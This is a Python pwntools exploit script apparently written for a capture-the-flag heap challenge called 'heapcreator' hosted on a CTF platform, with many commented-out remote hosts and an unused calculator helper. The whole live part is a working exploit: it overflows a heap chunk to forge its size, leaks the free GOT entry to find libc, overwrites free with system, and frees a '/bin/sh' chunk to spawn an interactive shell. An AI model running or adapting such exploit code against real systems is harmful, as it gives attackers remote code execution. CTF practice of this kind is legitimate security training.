from pwn import *

# import time

# from LibcSearcher import *

# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = process('./heapcreator')
# io = remote("47.104.24.40", 1337)
# io = remote("192.168.170.128", 9999)
# io = remote("13.229.222.125", 33390)


# io = remote("192.168.170.128", 1234)


# io = remote("192.168.170.128", 1234)
# io = remote("47.76.55.63", 23877)
io = remote("node4.buuoj.cn", 26994)


# io = remote("120.46.59.242",   2150)
# io = remote("43.249.195.138",  26189)
# io = remote("8.130.35.16", 52003)
# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("112.6.51.212", 30791)


# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./ciscn_2019_es_2')
# libc = ELF('./2.31-0ubuntu9_amd64/libc-2.31.so')


# libc = ELF('./libc-2.23.so')

def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


# libc = ELF('./libc.so.6')
# puts_plt = elf.plt['puts']
# puts_got = elf.got['puts']
# printf_plt = elf.plt['printf']
# atoi_got = elf.got['atoi']
# main_addr = elf.symbols['main']
elf = ELF('./heapcreator')

context(os='linux', arch='amd64')


# context(os='linux', arch='amd64', log_level="debug")


def add(size, content):
    io.sendlineafter("choice :", '1')
    io.sendlineafter("Heap : ", str(size))
    io.sendlineafter("heap:", content)


def edit(idx, content):
    io.sendlineafter("choice :", '2')
    io.sendlineafter("Index :", str(idx))
    io.sendlineafter("heap : ", content)


def show(idx):
    io.sendlineafter("choice :", '3')
    io.sendlineafter("Index :", str(idx))


def delete(idx):
    io.sendlineafter("choice :", '4')
    io.sendlineafter("Index :", str(idx))


free_got = elf.got['free']

# creat chunk
add(0x18, "aaaa")   # 0
add(0x10, "bbbb")   # 1
add(0x10, "cccc")   # 2
edit(0, b'/bin/sh\x00' + p64(0) * 2 + b'\x81')

# delete_chunk
delete(1)
# add_fake_chunk
add(0x70, p64(0) * 8 + p64(0x8) + p64(free_got))
show(2)
# gdb.attach(io)
free_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

# libc
libc = ELF('./libc.so.6')
base_addr = free_addr - libc.symbols['free']
system_addr = base_addr + libc.symbols['system']

edit(2, p64(system_addr))
delete(0)

inter()
